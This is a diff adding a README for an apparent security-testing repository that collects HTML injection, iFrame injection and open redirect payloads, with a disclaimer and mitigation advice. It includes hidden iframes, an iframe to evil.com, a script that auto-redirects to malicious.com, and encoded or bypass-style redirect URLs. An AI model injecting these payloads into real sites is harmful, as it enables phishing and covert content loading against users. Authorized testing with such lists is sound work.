@@ -1,2 +1,121 @@
 # HTML-iFrame
 Collection of HTML Injection, iFrame Injection, and Open Redirect payloads for educational and authorized security testing.
+
+# HTML, iFrame & Open Redirect Payloads
+
+> ⚠️ **Disclaimer**  
+> This repository is intended strictly for **educational and authorized security testing purposes**.  
+> Use these payloads only on applications you own or have explicit permission to test.  
+> The author is not responsible for misuse.
+
+---
+
+## 📌 Overview
+
+This repository contains a curated collection of payloads related to:
+
+- **HTML Injection**
+- **iFrame Injection**
+- **Open Redirect**
+
+These payloads are commonly used during **Web Application Security Testing (VAPT)** to validate improper input handling and insufficient output sanitization.
+
+---
+
+## 🧪 HTML Injection Payloads
+
+Basic payloads to test whether HTML input is rendered without sanitization:
+
+```
+<b>Test</b>
+<i>Injected</i>
+<h1>HTML Injection</h1>
+<div>Injected Content</div>
+```
+
+---
+
+## 🧪 iFrame Injection Payloads
+
+Payloads to test whether iFrame tags are allowed or improperly filtered:
+```
+<html> <iframe src=https://evil.com/ width=600px height=500 px></iframe> </html>
+```
+
+```
+<iframe src="https://example.com"></iframe>
+```
+
+---
+
+## 🧪 iFrame Injection (Hidden / Size Manipulation)
+
+```
+<iframe src="https://example.com" width="0" height="0"></iframe>
+```
+```
+<iframe src="https://example.com" style="display:none"></iframe>
+```
+
+---
+
+## 🧪 Open Redirect Payloads
+
+Payloads to test redirection based on user-controlled input:
+
+```
+<a href="http://malicious.com" id="redirect">Click here</a>
+<script>document.getElementById('redirect').click();</script>
+```
+
+```
+https://target.com/redirect?url=https://example.com
+```
+```
+https://target.com/login?next=https://example.com
+```
+
+---
+
+## 🧪 Open Redirect (Encoded Payloads)
+
+```
+https://target.com/redirect?url=%68%74%74%70%73%3A%2F%2Fexample.com
+```
+
+---
+
+## 🧪 Open Redirect (Relative / Bypass Variants)
+
+```
+https://target.com/redirect?url=/\/example.com
+```
+```
+https://target.com/redirect?url=https:example.com
+```
+
+---
+
+## ⚠️ Notes
+
+- Payload success depends on **context**, **filters**, and **application logic**.
+- Not all payloads indicate a security risk; assess impact carefully.
+- Open Redirect issues can enable phishing and user redirection attacks.
+
+---
+
+## 🛡 Mitigation Guidance (High-Level)
+
+- Perform proper input validation
+- Apply output encoding based on context
+- Restrict allowed HTML tags and attributes
+- Validate and whitelist redirect destinations
+- Avoid using user input directly in redirects
+
+---
+
+## 📚 References
+
+- OWASP HTML Injection  
+- OWASP Open Redirect  
+- CWE-79, CWE-601  
